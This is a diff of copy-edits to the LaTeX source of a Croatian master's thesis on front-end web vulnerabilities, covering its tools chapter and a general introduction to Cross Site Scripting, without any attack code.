@@ -189,11 +189,11 @@ Diplomski rad obuhvaća pronalazak front-end ranjivosti web aplikacija, njihovo 
 
 Front-end ranjivosti web aplikacija koje su opisane u ovom diplomskom radu proizlaze iz softverskih okvira (eng. framework) pomoću kojih su napravljene web aplikacije, npr. React ili ASP. NET framework. Pored softverskih okvira, ranjivosti mogu proizaći iz baze podataka koju web aplikacija koristi u pozadini, koja se može zloupotrijebiti preko front-enda web aplikacije. Ranjivosti također mogu biti uzrokovane načinom na koji je web aplikacija izgrađena, odnosno ranjivosti mogu nastati zbog provođenja loših dizajnerskih uzoraka (eng. designe patterns). Pored navedenih izvora, ranjivosti mogu proizaći iz temeljnih tehnologija na kojima se zasnivaju web stranice, kao npr. HTML, CSS i JavaScript. U nekim situacijama ranjivosti se ne javljaju zbog loše implementacije navedenih tehnologija, već zbog njihove loše interpretacije od strane web preglednika.
 
-U sljedećem poglavlju su opisane tehnologije i alati koji su korištene prilikom izrade ovog diplomskog rada u koje spadaju: HTML, CSS te JavaScript kao osnovne tehnologije na kojima se zasnivaju web stranice zatim ExpressJS softverski okvir za JavaScript, ASP .NET platforma za izradu opsežnih web aplikacija, PHP serverski skriptni jezik, Wireshark alat za analizu mrežnih paketa, Kali Linux operacijski sustav za pen testiranje, tcpdump alat za analizu mrežnih podataka iz komandne linije te MS SQL relacijska baza podataka.
+U sljedećem poglavlju su opisane tehnologije i alati koji su korišteni prilikom izrade ovog diplomskog rada u koje spadaju: HTML, CSS te JavaScript kao osnovne tehnologije na kojima se zasnivaju web stranice zatim ExpressJS softverski okvir za JavaScript, ASP .NET platforma za izradu opsežnih web aplikacija, PHP serverski skriptni jezik, Wireshark alat za analizu mrežnih paketa, Kali Linux operacijski sustav za pen testiranje, tcpdump alat za analizu mrežnih podataka iz komandne linije te MS SQL relacijska baza podataka.
 
 Treće poglavlje sadrži opis tipova napada i ranjivosti koji su obrađeni u ovom diplomskom radu. Svaki tip napada je opisan, zajedno s primjerima izvođenja takvih napada te metodama obrane od istih. Neki od navedenih tipova napada se mogu podijeliti na daljnje podtipove koji su također opisani. Tipovi napada koji ovaj diplomski rad obrađuje su Cross Site Scripting, DOM clobbering, SQL injection te keylogger-i.
 
-U četvrtom poglavlju su detaljno opisni pojedine pronađene ranjivosti, način funkcioniranja web stranica koje su korištene za demonstraciju napada, metode i tehnike korištene prilikom izvođenja napada te načini prevencije opisanih napada.
+U četvrtom poglavlju su detaljno opisne pojedine pronađene ranjivosti, način funkcioniranja web stranica koje su korištene za demonstraciju napada, metode i tehnike korištene prilikom izvođenja napada te načini prevencije opisanih napada.
 
 Na kraju diplomskog rada nalaze se zaključak zatim literatura, koja je korištena u izradi ovog rada, popis oznaka i kratica te naposljetku sažetak s ključnim riječima.
 
@@ -219,7 +219,7 @@ HTML je najšire korišten jezik na internetu za razvoj web stranica. HTML je st
 Danas se koristi HTML-5 verzija jezika koja je nadogradnja na prethodnu verziju. HTML se ne može smatrati programskim jezikom jer se njime ne mogu izvršiti niti najjednostavnije logičke radnje, već se HTML može nazvati opisnim jezikom. Iako je originalno namijenjen za strukturiranje znanstvenih dokumenata, time što bi definirao zaglavlja, tablice i paragrafe, danas se HTML koristi za opisivanje strukture web stranica pomoću oznaka (eng. HTML tag) koje pruža HTML jezik. Osim strukturiranje dokumenta, HTML pruža oznake kojima je moguće prelaziti s jedne stranice na drugu \cite{html}.
 
 \section{CSS}
-CSS je jednostavan jezik namijenjen za stiliziranje izgleda web stranica napisane pomoću HTML ili XHTML jezika. CSS pruža mogućnost kontrole boje teksta, odabira fontova, uređivanja razmaka između paragrafa, uređivanja rasporeda i veličine stupaca, odabira pozadine, uređivanje rasporeda elementa na stranici, prikazivanja različitog dizajna s obzirom na uređaj na kojem se web stranica prikazuje itd. CSS pruža mogućnost uređivanja boje, pozadina, fontova, teksta, slika, poveznica ili linkova, tablica, rubova (eng. borders), margina, listi, punjenja (eng. padding), kursora, obrisa (eng. outline), trake za pomicanje (eng. scrollbar). Neki od navedenih načina uređivanja, poput boje i pozadine, se mogu primijeniti na više tipova HTML elementa, a ne samo na tekstualne elemente. Dodatne mogućnosti koje CSS podržava su: 
+CSS je jednostavan jezik namijenjen za stiliziranje izgleda web stranica napisane pomoću HTML ili XHTML jezika. CSS pruža mogućnost kontrole boje teksta, odabira fontova, uređivanja razmaka između paragrafa, uređivanja rasporeda i veličine stupaca, odabira pozadine, uređivanje rasporeda elementa na stranici, prikazivanja različitog dizajna s obzirom na uređaj na kojem se web stranica prikazuje itd. CSS pruža mogućnost uređivanja boje, pozadina, fontova, teksta, slika, poveznica ili linkova, tablica, rubova (eng. borders), margina, listi, punjenja (eng. padding), kursora, obrisa (eng. outline) te traka za pomicanje (eng. scrollbar). Neki od navedenih načina uređivanja, poput boje i pozadine, se mogu primijeniti na više tipova HTML elementa, a ne samo na tekstualne elemente. Dodatne mogućnosti koje CSS podržava su: 
 
 \begin{itemize}
 \item Zaobljeni rubovi
@@ -253,7 +253,9 @@ CSS za rukovanje navedenim metodama oblikovanja dizajna web stranice omogućava 
 Svi navedeni načini uređivanja se mogu primijeniti na jedan HTML element, označen jedinstvenim id nazivom. jedno CSS pravilo se može primijeniti na više HTML elemenata koji su dio iste klase \cite{css_tut}.
 
 \section{JavaScript}
-JavaScript je interpretativni programski jezik s prvorazrednim funkcijama (eng. first-class functions) te je najbolje poznat kao skriptni jezi za web stranice, iako se koristi i u programskim okruženjima van web preglednika. JavaScript je dinamičan, jednodretveni jezik koji podržava objektno-orijentirani, imperativni i funkcionalni način programiranja. JavaScript posjeduje sintaksu koja je slična programskim jezicima Java i C++ kako bi se smanjio broj novih koncepata koje je potrebno za naučiti, stoga funkcionalnosti kao što su petlje, uvjetne naredbe (eng. if statement), switch i try catch blokovi. Pored navedenih, JavaScript sadrži i neke druge funkcionalnosti koje se mogu naču i u drugim jezicima, kao što su:
+JavaScript je interpretativni programski jezik s prvorazrednim funkcijama (eng. first-class functions) te je najbolje poznat kao skriptni jezi za web stranice, iako se koristi i u programskim okruženjima van web preglednika. JavaScript je dinamičan, jednodretveni jezik koji podržava objektno-orijentirani, imperativni i funkcionalni način programiranja. JavaScript posjeduje sintaksu koja je slična programskim jezicima Java i C++ kako bi se smanjio broj novih koncepata koje je potrebno za naučiti, stoga funkcionalnosti kao što su petlje, uvjetne naredbe (eng. if statement), switch i try catch blokovi se ponašaju na isti način kao i u navedenim jezicima. Pored navedenih, JavaScript sadrži i neke druge funkcionalnosti koje se mogu nači i u drugim jezicima, kao što su:
+
+\pagebreak
 
 \begin{itemize}
 \item Varijable
@@ -265,7 +267,7 @@ JavaScript je interpretativni programski jezik s prvorazrednim funkcijama (eng. 
 \item Različiti tipovi varijabli
 \end{itemize}
 
-Kao jedan od najraširenijih programskih jezika za izradu front-end-a i back-end-a opseg primjene ovog jezika je velik. Neke od čestih primjena ovog jezika prilikom izrade web aplikacije su:
+Kao jedan od najraširenijih programskih jezika za izradu front-end-a i back-end-a, opseg primjene ovog jezika je širok. Neke od čestih primjena ovog jezika prilikom izrade web aplikacije su:
 
 \begin{itemize}
 \item Server aplikacije korištenjem dostupnih JavaScript biblioteka
@@ -274,7 +276,7 @@ Kao jedan od najraširenijih programskih jezika za izradu front-end-a i back-end
 \item Dinamičke korisničke obavijesti
 \end{itemize}
 
-Pored svega navedenog, najveću prednost koju JavaScript posjeduje naspram drugih programskih jezika, pogotovo u području izrade web aplikacija, je veliki broj biblioteka i softverskih okvira od kojih su najpoznatiji \cite{js}, \cite{ajs}
+Pored svega navedenog, najveću prednost koju JavaScript posjeduje naspram drugih programskih jezika, pogotovo u području izrade web aplikacija, je veliki broj biblioteka i softverskih okvira, od kojih su najpoznatiji \cite{js}, \cite{ajs}
 
 \begin{itemize}
 \item Angular
@@ -291,28 +293,28 @@ Pored svega navedenog, najveću prednost koju JavaScript posjeduje naspram drugi
 ExpressJS je softverski okvir koji pruža jednostavno aplikacijsko programsko sučelje (eng. API-Application programming interface) za izradu back-end-a web aplikacija. Za povećanje fleksibilnosti, ExpressJS se može nadograditi brojnim npm modulima. Funkcionalnosti koje ExpressJS podržava su \cite{expss} 
 
 \begin{itemize}
-\item \textbf{Rutiranje}, koje omogućava da za danu putanju i tip HTTP zahtjeva web aplikacija izvrši željene radnje
-\item \textbf{Dinamični URL}, kojim je moguće stvoriti predložak putanje, sličan regularnom izrazu, za koje se ExpressJS ponaša na isti način
-\item \textbf{Međusoftver} (eng. middleware), je funkcija koja obrađuje svaki HTTP zahtjev prije funkcije rutiranja, obično se koriste za parsiranje tijela zahtjeva ili dodavanja zaglavlja
-\item \textbf{Šabloniranje stranica}, omogućava izradu šablonskih stranica kojima je moguće proslijediti podatke za popunjavanje naznačenih mjesta u stranici
-\item \textbf{Statični dokumenti}, omogućavaju dohvaćanje nepromjenjivih dokumenata preko relativne putanje u odnosu na korijensku datoteku
-\item \textbf{Rukovanje podatcima obrazaca} (eng. form data), omogućava obrađivanje podataka koji su web aplikaciji poslani preko obrasca. Za ovo se često koristi međusoftver body-parser
-\item \textbf{Rad s bazama}, koji se ostvaruje preko API-a za pojedinu dostupan kao npm modul, na ovaj način web aplikacija može spremati podatke za naknadno korištenje
-\item \textbf{Kolačići}, korištenjem npm modula poput cookie-parser moguće je pratiti korisnika na web aplikaciji
-\item \textbf{Sesije}, kojima je moguće pratiti korisnika na web aplikaciji, kao i kod kolačića, ali tako da podatci nisu vidljivi na klijentskoj strani, već je sve spremljeno na serveru, a klijentu je vidljiv samo njemu dodijeljen ID
-\item \textbf{Autentikacija}, kojom provjeravamo dali stranici pristupa korisnik koji ima pravo ulaska u stranicu. Autentikacija se obično radi preko korisničkog imena i lozinke
-\item \textbf{RESTful API}, omogućava da na jednostavan način, korištenjem URL putanja i HTTP metoda baratamo s podatcima u bazi
-\item \textbf{Upravljanje greškama}, koje se obavlja pomoću zasebnog međusoftvera, omogućava web aplikaciji da prilikom greške ostanu aktivne, te obavijeste korisnika o nastaloj grešci
+\item Rutiranje, koje omogućava da za danu putanju i tip HTTP zahtjeva web aplikacija izvrši željene radnje
+\item Dinamični URL, kojim je moguće stvoriti predložak putanje, sličan regularnom izrazu, za koje se ExpressJS ponaša na isti način
+\item Međusoftver (eng. middleware), je funkcija koja obrađuje svaki HTTP zahtjev prije funkcije rutiranja, obično se koriste za parsiranje tijela zahtjeva ili dodavanja zaglavlja
+\item Šabloniranje stranica, omogućava izradu šablonskih stranica kojima je moguće proslijediti podatke za popunjavanje na naznačenim mjestima u stranici
+\item Statični dokumenti, omogućavaju dohvaćanje nepromjenjivih dokumenata preko relativne putanje u odnosu na korijensku datoteku
+\item Rukovanje podatcima obrazaca (eng. form data), omogućava obrađivanje podataka koji su web aplikaciji poslani preko obrasca. Za ovo se često koristi međusoftver body-parser
+\item Rad s bazama, koji se ostvaruje preko API-a za pojedinu bazu podataka, dostupan kao npm modul. Na ovaj način web aplikacija može spremati podatke za naknadno korištenje
+\item Kolačići, korištenjem npm modula poput cookie-parser moguće je pratiti korisnika na web aplikaciji
+\item Sesije, kojima je moguće pratiti korisnika na web aplikaciji, kao i kod kolačića, ali tako da podatci nisu vidljivi na klijentskoj strani, već je sve spremljeno na serveru, a klijentu je vidljiv samo njemu dodijeljen ID
+\item Autentikacija, kojom provjeravamo dali stranici pristupa korisnik koji ima pravo ulaska u stranicu. Autentikacija se obično radi preko korisničkog imena i lozinke
+\item RESTful API, omogućava da na jednostavan način, korištenjem URL putanja i HTTP metoda baratamo s podatcima u bazi
+\item Upravljanje greškama, koje se obavlja pomoću zasebnog međusoftvera, omogućava web aplikaciji da prilikom greške ostanu aktivne, te obavijeste korisnika o nastaloj grešci
 \end{itemize}
 
 \section{PHP}
-PHP je serverski skriptni jezik koji je ugrađen u HTML te se koristi za stvaranje dinamičkog sadržaja, otvaranje komunikacije s bazom te praćenje sesija. PHP ima sličnu sintaksu kao i C kako bi se smanjila potreba za učenjem novih koncepata. Jezik je također integriran sa najkorištenijim bazama podataka kao što su MySQL, PostgreSQL, Oracle, Sybase i MS SQL. PHP je iznimno brz u svom izvršavanju pogotovo kada se vrti kao Apache modul na sustavima baziranim na Unix-u te u kombinaciji s MySQL bazom podataka \cite{php}.
+PHP je serverski skriptni jezik koji je ugrađen u HTML te se koristi za stvaranje dinamičkog sadržaja, otvaranje komunikacije s bazom te praćenje sesija. PHP ima sličnu sintaksu kao i C kako bi se smanjila potreba za učenjem novih koncepata. Jezik je također integriran s najkorištenijim bazama podataka kao što su MySQL, PostgreSQL, Oracle, Sybase i MS SQL. PHP je iznimno brz u svom izvršavanju pogotovo kada se vrti kao Apache modul na sustavima baziranim na Unix-u te u kombinaciji s MySQL bazom podataka \cite{php}.
 
 Česte primjene PHP-a su:
 
 \begin{itemize}
 \item Rad s dokumentima
-\item Obrada formi, prikupljanje i spremanje podataka u dokumente te slati i primati e-mailove
+\item Obrada formi, prikupljanje i spremanje podataka u dokumente te slanje i primanje e-mailova
 \item Rad nad bazom podataka
 \item Upravljanje kolačićima i sesijama
 \item Restrikcija stranica određenim korisnicima
@@ -320,23 +322,27 @@ PHP je serverski skriptni jezik koji je ugrađen u HTML te se koristi za stvaran
 \item Rad s GET i POST HTTP zahtjevima
 \end{itemize}
 
+\pagebreak
+
 \section{ASP .NET}
 ASP .NET je platforma za razvoj koja pruža opsežnu softversku infrastrukturu te mnoštvo različitih servisa potrebnih za izgradnju robusne web aplikacije, bilo za mobilne uređaje ili računala. ASP .NET funkcionira povrh HTTP protokola te koristi HTTP za uspostavu komunikacije između servera i web preglednika. ASP .NET aplikacije mogu biti napisane koristeći C\#, Visual Basic .Net, Jscript, J\#.
 
-ASP .NET web forme donose interakcije upravljane događajima (eng. event-driven) kod web aplikacija. Kako je HTTP protokol koji ne posjeduje stanja (eng. stateless), ASP .NET pomaže u pohranjivanju informacija vezane za stanje aplikacije, koje se sastoji od stanja stranice i stanja sesije.
+ASP .NET web forme donose interaktivno upravljane događajima (eng. event-driven) kod web aplikacija. Kako je HTTP protokol ne posjeduje stanja (eng. stateless), ASP .NET pomaže u pohranjivanju informacija vezane za stanje aplikacije, koje se sastoje od stanja stranice i stanja sesije.
 
-ASP .NET model komponenti (eng. component model) je objektni model koji opisuje gotovo sve elemente na strani servera koji odgovaraju HTML elementima te serverske kontrole, kojima se razvijaju korisnička sučelja. Kako je ASP .NET baziran na objektno orijentiranoj hijerarhiji to znači da je svaka ASP .NET stranica objekt, kao i sve njezine komponente \cite{aspnet}. 
+ASP .NET model komponenti (eng. component model) je objektni model koji opisuje gotovo sve elemente na strani servera koji odgovaraju HTML elementima i serverskim kontrolama, kojima se razvijaju korisnička sučelja. Kako je ASP .NET baziran na objektno orijentiranoj hijerarhiji to znači da je svaka ASP .NET stranica objekt, kao i sve njezine komponente \cite{aspnet}. 
 
 Prednosti ASP .NET-a su:
 
 \begin{itemize}
 \item Podržavanje više jezika
 \item Jednostavna izrada velikih aplikacija
-\item Mogućnost izrade fornt-end-a i back-end-a web aplikacije na istoj platformi
+\item Mogućnost izrade front-end-a i back-end-a web aplikacije na istoj platformi
 \item Podržavanje dinamičkih web stranica
 \item Jednostavno postavljanje web aplikacija
 \item Visoke performanse korištenjem JIT kompajliranja, ranog vezivanja (eng. early binding) te usluga kaširanja
 \end{itemize}
+
+\pagebreak
 
 \section{Wireshark}
 
@@ -344,14 +350,16 @@ Wireshark je najrašireniji i najpoznatiji alat za analizu mrežnih protokola ko
 
 \begin{itemize}
 \item Mogućnost snimanja prometa na mreži te sposobnost naknadne analize
-\item Snimljeni mrežni promet podataka se može pregledati putem GUI-a ili programatski korištenjem TTY moda TShark programa
+\item Snimljeni mrežni promet podataka se može pregledati putem GUI-a ili programatski, korištenjem TTY moda TShark programa
 \item Preglednik paketa
 \item Mogućnost duboke inspekcije više od stotinu protokola
 \item Filtriranje prometa po raznim kategorijama
 \item Mogućnost analize VoIP-a
-\item Mogućnost snimanja prometa podataka s raznih adaptera, poput: Ethernet, IEEE 802.11, Bluetooth, USB, ATM, PPP/HDLC te mnogi drugi adapteri u koje spadaju virtualni adapteri potrebne za virtualne mašine
+\item Mogućnost snimanja prometa podataka s raznih adaptera, poput: Ethernet, IEEE 802.11, Bluetooth, USB, ATM, PPP/HDLC te mnogih drugih adaptera u koje spadaju virtualni adapteri koji su potrebni za virtualne mreže
 \item Podrška dekripcije raznih protokola, poput: IPsec, ISAKMP, Kerberos, SNMPv3, SSL/TLS, WEP te WPA/WPA2
 \end{itemize}
+
+\pagebreak
 
 \section{Kali Linux}
 Kali Linux je Linux distribucija bazirana na Deabian-u koja je namijenjena za napredno probojno testiranje (eng. penetration testing ili pen testing) te sigurnosne preglede. 
@@ -365,7 +373,7 @@ Karakteristike Kali Linuxa su:
 \item Linux distribucija napisana kao kod otvorenog tipa (eng. open-source code)
 \item Poštuje FHS koji omogućava Linux korisnicima jednostavan pronalazak biblioteka te pomoćnih datoteka
 \item široka podrška bežičnih uređaja, koja obično predstavljaju problem za Linux distribucije
-\item Jako velika mogućnost prilagodbe, što uključuje i kernel
+\item Jako velika mogućnost prilagodbe samog operacijskog sustava, što uključuje i kernel
 \item Podrška za ARMEL i ARMHF što omogućava korištenje Kali Linux-a na uređajima poput Rasbery Pi ili BeagleBone Black
 \end{itemize}
 
@@ -374,7 +382,9 @@ Tcpdump je besplatan računalni program za analizu mrežnih paketa koji se pokre
 
 Tcpdump se koristi na Unix sličnim operacijskim sustavima kao što su Linux, Solaris, FreeDBS, macOS, OpenDBS, OpenWrt. U navedenim operacijskim sustavima tcpdump koristi biblioteku libpcap za hvatanje mrežnih paketa. Verzija tcpdump za Windows operacijske sustave se zove WinDump koja koristi WinPcap biblioteku, koja je preslika libpcap biblioteke za Windows.
 
-Tcpdump omogućava hvatanje mrežnih paketa WiFi, Ethernet, USB, Bluetooth te virtualnih adaptera. Nakon što program završi s hvatanjem paketa, na standardom izlazu se ispisuje sljedeće \cite{tpdump}
+\pagebreak
+
+Tcpdump omogućava hvatanje mrežnih paketa preko WiFi-a, Ethernet-a, USB-a, Bluetooth-a te virtualnih adaptera. Nakon što program završi s hvatanjem paketa, na standardom izlazu se ispisuje sljedeće: \cite{tpdump}
 
 \begin{itemize}
 \item Broj uhvaćenih paketa, predstavlja broj primljenih i obrađenih paketa
@@ -383,13 +393,13 @@ Tcpdump omogućava hvatanje mrežnih paketa WiFi, Ethernet, USB, Bluetooth te vi
 \end{itemize}
 
 \section{BIND}
-BIND je popularni softver za razlučivanje domenskih imena u IP adrese, odnosno za kreiranja DNS servera koji je obično koriste na Linux sustavima. BIND je originalno napisan 1980-tih na Berkeley kampusu na sveučilištu u Kaliforniji, a trenutno je softver otvorenog koda. Za jednostavne, male mreže BIND je i više nego dovoljan za pružanje DNS usluga.
+BIND je popularni softver za razlučivanje domenskih imena u IP adrese, odnosno za kreiranje DNS servera koji se obično koriste na Linux sustavima. BIND je originalno napisan 1980-tih na Berkeley kampusu na sveučilištu u Kaliforniji, a trenutno je softver otvorenog koda. Za jednostavne, male mreže, BIND je i više nego dovoljan za pružanje DNS usluga.
 
-Funkcionalnosti koje BIND pruža su \cite{bind}
+Funkcionalnosti koje BIND pruža su: \cite{bind}
 
 \begin{itemize}
 \item Stvaranje autoritativnog DNS-a, koji objavljuje DNS zone i zapise pod serverskom autoritativnom kontrolom kao primarni ili sekundarni server
-\item Razdvojeni DNS, koji omogućava objavljivanje više verzija DNS imenskog prostora što uključuje pružanje različitih setova podataka unutarnjim korisnicima te Internetu kao cjelini
+\item Razdvojeni DNS, koji omogućava objavljivanje više verzija DNS imenskog prostora što uključuje pružanje različitih setova podataka unutarnjim korisnicima i Internetu
 \item Rekurzivni DNS, koji hvata podatke od drugih DNS servera u ime klijentskog sistema u što spadaju mobilni uređaji, stolna računala i serveri
 \item Dinamično ažuriranje, kojim se dodaju ili brišu zapisi u primarni server specifičnom vrstom DNS poruka
 \item Učinkovita replikacija podataka, koja omogućava kopiranje podataka s primarnog na sekundarni server
@@ -400,9 +410,9 @@ Funkcionalnosti koje BIND pruža su \cite{bind}
 \end{itemize}
 
 \section{Microsoft SQL}
-Microsoft SQL Server ili MS SQL je upravljački sustav za relacijsku bazu podataka razvijen od strane Microsoft-a. Ova baza podataka je napravljena za jednostavne funkcionalnosti pohrane te dohvaćanja podataka na zahtjev aplikacije. MS SQL se može pokrenuta lokalno ili na drugom računalu, u kom slučaju se bazi pristupa preko mreže.
+Microsoft SQL Server ili MS SQL je upravljački sustav za relacijsku bazu podataka razvijen od strane Microsoft-a. Ova baza podataka je napravljena za jednostavne funkcionalnosti pohrane te dohvaćanja podataka na zahtjev aplikacije. MS SQL se može pokrenuti lokalno ili na drugom računalu, u kom slučaju se bazi pristupa preko mreže.
 
-Arhitektura MS SQL Servera se sastoji od generalne, memorijske, podatkovne i zapisne arhitekture. Generalna arhitektura se sastoji od:
+Arhitektura MS SQL Servera se sastoji od generalne, memorijske, podatkovne i zapisne arhitekture. Generalnu arhitekturu čine:
 
 \begin{itemize}
 \item Klijent, odakle dolaze zahtjevi
@@ -410,12 +420,14 @@ Arhitektura MS SQL Servera se sastoji od generalne, memorijske, podatkovne i zap
 \item Logičke jedinice, gdje spadaju ključne riječi, izrazi i operatori
 \item N/W paketi, kod vezan za mrežu
 \item Protokoli, u koje spadaju zajednička memorija, imenovane cijevi (eng. named pipes), TCP/IP te VIA
-\item Server gdje se nalaze SQL servisi i baza podataka
+\item Server, gdje se nalaze SQL servisi i baza podataka
 \item Relacijski pogonski sklop (eng. relation engine), obavlja svu egzekuciju te se sastoji od parsera upita, optimizatora upita te izvršitelja upita
 \item Plan izvršavanja, sadrži red izvršavanja radnji
-\item Pogonski sklop za pohranu (eng. storage engine), zadužen je za pohranu i dohvaćanje podataka, manipulaciju podatcima i zaključavanje i upravljanje transakcijama
+\item Pogonski sklop za pohranu (eng. storage engine), zadužen je za pohranu i dohvaćanje podataka, manipulaciju podatcima i zaključavanje te upravljanje transakcijama
 \item SQL operacijski sustav ili SQL OS, služi kao posrednik između operacijskog sustava računala i SQL servera.
 \end{itemize}
+
+\pagebreak
 
 Ključne stavke memorijske arhitekture su:
 
@@ -431,14 +443,14 @@ Podatkovna arhitektura se sastoji od:
 
 \begin{itemize}
 \item Grupe dokumenata, koriste se radi jednostavnije alokacije i organizacije dokumenata. Dokument može pripadati samo jednoj grupi dokumenata, dok se zapisi upravljaju zasebno. Grupe se dijele na primarne, koje su zadane grupe, te korisnički definirane grupe dokumenata
-\item Postoje 3 vrste tipova dokumenata, primarni, sekundarni te zapisni tip dokumenta. Primarni tip dokumenta pokazuje na druge dokumente u bazi podataka te posjeduje ekstenziju .mdf. U bazi može biti više sekundarnih tipova datoteka te se preporučuje da one koriste ekstenziju .ndf. Zapisne datoteke sadrže zapisnik koji koristimo za povrat informacija ako se nešto dogodilo s podatcima u bazi, preporučena ekstenzija je .ldf
+\item Postoje 3 vrste tipova dokumenata, primarni, sekundarni te zapisni tip dokumenta. Primarni tip dokumenta pokazuje na druge dokumente u bazi podataka te posjeduje ekstenziju .mdf. U bazi može biti više sekundarnih tipova datoteka te se preporučuje da one koriste ekstenziju .ndf. Zapisne datoteke sadrže zapisnik koji se koristi za povrat informacija ako se nešto dogodi s podatcima u bazi, preporučena ekstenzija je .ldf
 \item Extent je najmanja jedinica podataka koja se koristi za alociranje tablica. On se sastoji od 8 stranica ili 64KB. Postoje dvije vrste extent-ova, uniformni i miješani. Uniformni sadrži samo jedan objekt dok miješani mogu sadržavati i do 8 objekata
 \item Stranica je temeljna jedinica podataka u MS SQL serveru koja iznosi 8KB. Na početku svake stranice se nalazi zaglavlja koje sadrži informacije o stranici. Tipovi stranica su: podatci, indeksi, Tex/slike, GAM (podatci o alociranim extent-ovima), SGAM (podatci o alociranim extent-ovima na razini sistema), PFS (informacija o slobodnom prostoru na stranici), IAM(informacija o extent-ovima koje koriste tablice i indeksi), BCM(informacije o extent-ovima koje su mijenjale bulk operacije od zadnjeg pohranjivanja), DCM(informacije o extent-ovima koji su se promijenili od zadnjeg pohranjivanja) 
 \end{itemize}
 
-Zapisna arhitektura se sastoji od zapisa transakcija sastavljen od zapisa označen sa identifikacijskim brojem (eng.LSN-Log Sequence Number). Zapisi bilježe promjene na podatcima time što se zapisuju napravljene logičke operacije ili time što se pamti stanje podataka prije i poslije promjene. Pomoću zapisa moguće je vratiti podatke u prijašnje stanje tako da se izvrše inverzne operacije nad podatcima. U zapis se bilježe početak i kraj transakcije, sve promjene napravljene na podatcima, svaka alokacija i dealokacija extent-ova i stranica, stvaranje ili brisanje tablica ili indeksa te operacije povrata podataka na prethodno stanje. 
+Zapisna arhitektura se sastoji od zapisa transakcija sastavljen od zapisa označen s identifikacijskim brojem (eng.LSN-Log Sequence Number). Zapisi bilježe promjene na podatcima time što se zapisuju napravljene logičke operacije ili time što se pamti stanje podataka prije i poslije promjene. Pomoću zapisa moguće je vratiti podatke u prijašnje stanje tako da se izvrše inverzne operacije nad podatcima. U zapis se bilježe početak i kraj transakcije, sve promjene napravljene na podatcima, svaka alokacija i dealokacija extent-ova i stranica, stvaranje ili brisanje tablica ili indeksa te operacije povrata podataka na prethodno stanje. 
 
-Funkcionalnosti koje pruža MS SQL Server su \cite{mssql}
+Funkcionalnosti koje pruža MS SQL Server su: \cite{mssql}
 
 \begin{itemize}
 \item Autentikacija za pristup bazi, koja može obavljati preko Windows akreditiva, korisničkog imena i lozinke specifični za SQL server, certifikata te asimetričnih ključeva
@@ -447,11 +459,11 @@ Funkcionalnosti koje pruža MS SQL Server su \cite{mssql}
 \item Stvaranje sigurnosne kopije baze
 \item Stvaranje korisnika koji imaju pristup bazi
 \item Dodavanje privilegija korisnicima
-\item HA funkcionalnosti, koje osiguravaju visoku dostupnost baze. Ova funkcionalnost se postiže replikacijom, prijenos zapisa (eng. log shipping), zrcaljenje, nakupljanje podataka (eng. clustering) te uvijek dostupnim grupama (eng. alwaysON alvailavility groups)
+\item HA funkcionalnosti, koje osiguravaju visoku dostupnost baze. Ova funkcionalnost se postiže replikacijom, prijenos zapisa (eng. log shipping), zrcaljenjem, nakupljanjem podataka (eng. clustering) te uvijek dostupnim grupama (eng. alwaysON availability groups)
 \end{itemize}
 
 \chapter{KORIŠTENI TIPOVI NAPADA}
-Ranjivost web aplikacija su slabosti ili pogrešne konfiguracije koje se nalaze u kodu web aplikacija ili web stranica koje omogućavaju napadaču da dobije određenu razinu kontrole nad stranicom ili serverom. Većina ranjivosti se iskorištavaju pomoću automatiziranijih sustava poput skenera ranjivosti ili botnet-ova. Specijalizirani alati su napravljeni od strane napadača kako bi pronašli poznate ranjivosti na specifičnim platformama kao što su WordPress i Joomla. Nakon što su ranjivosti pronađene, one se zloupotrijebe kako bi se izvukli podatci sa stranice ili unio maliciozan sadržaj \cite{ranj}.
+Ranjivost web aplikacija su slabosti ili pogrešne konfiguracije, koje se nalaze u kodu web aplikacija ili web stranica, koje omogućavaju napadaču da dobije određenu razinu kontrole nad stranicom ili serverom. Većina ranjivosti se iskorištavaju pomoću automatiziranijih sustava poput skenera ranjivosti ili botnet-ova. Specijalizirani alati su napravljeni od strane napadača kako bi pronašli poznate ranjivosti na specifičnim platformama kao što su WordPress i Joomla. Nakon što su ranjivosti pronađene, one se zloupotrijebe kako bi se izvukli podatci sa stranice ili unio maliciozan sadržaj \cite{ranj}.
 
 Napadi koji su korišteni u izradi obog diplomskog rada su:
 
@@ -463,7 +475,9 @@ Napadi koji su korišteni u izradi obog diplomskog rada su:
 \end{itemize}
 
 \section{Cross Site Scripting}
-Cross Site Scripting ili XSS napad je jedan od najčešćih napada na aplikacijski razini. XSS ranjivosti otvaraju mogućnost napada na skripte koje su ugrađene u web stranicu te se izvršavaju na klijentskoj strani web aplikacije, odnosno u web pregledniku. XSS ranjivosti proizlaze iz skriptnih jezika koje se koriste na klijentskoj strani aplikacije, kao npr. HTML i JavaScript. Cilj XSS napada je izmanipulirati skripte, koje se izvršavaju u web pregledniku, da se ponašaju, ne kako su to namijenili dizajneri web aplikacije, već kako napadač hoće. Ovakvi napadi mogu ubaciti skriptu unutar stranice koja će se izvršavati svaki put kada se stranica učita ili kada se odgovarajući događaj napravi.
+Cross Site Scripting ili XSS napad je jedan od najčešćih napada na aplikacijskoj razini. XSS ranjivosti otvaraju mogućnost napada na skripte koje su ugrađene u web stranicu te se izvršavaju na klijentskoj strani web aplikacije, odnosno u web pregledniku. XSS ranjivosti proizlaze iz skriptnih jezika koje se koriste na klijentskoj strani aplikacije, kao npr. HTML i JavaScript. Cilj XSS napada je izmanipulirati skripte, koje se izvršavaju u web pregledniku, da se ponašaju, ne kako su to namijenili dizajneri web aplikacije, već kako napadač hoće. Ovakvi napadi mogu ubaciti skriptu unutar stranice koja će se izvršavati svaki put kada se stranica učita ili kada se odgovarajući događaj napravi.
+
+\pagebreak
 
 XSS ranjivosti nastaju kada web aplikacija primi podatke od korisnika te ih dinamički inkorporira u stranicu bez da se prije toga podatci provjere. Primjer ovakve ranjivosti je situacija u kojoj web aplikacija ne sanitizira ime korisnika koji može sadržavati HTML img element koji kada dođe do greške izvršava proizvoljni kod. Ovakve ranjivosti napadaču omogućavaju izvršavanje proizvoljnog koda ili prikaza bilo kakvog sadržaja unutar web preglednika žrtve. Uspješan XSS napad može značiti da napadač dobije kontrolu nad žrtvinim web preglednikom ili profilom na ranjivoj web aplikaciji. Iako je XSS ugrađen u ranjivu web aplikaciju, žrtve aplikacije su njeni korisnici, a ne sama aplikacija. Snaga XSS ranjivosti leži u činjenici da se maliciozni kod izvršava unutar žrtvine sesije, što omogućava napadačima da zaobiđu normalne sigurnosne restrikcije \cite{xsstut}.
 
@@ -476,7 +490,7 @@ XSS napadi se mogu podijeliti na tri tipa:
 \end{itemize}
 
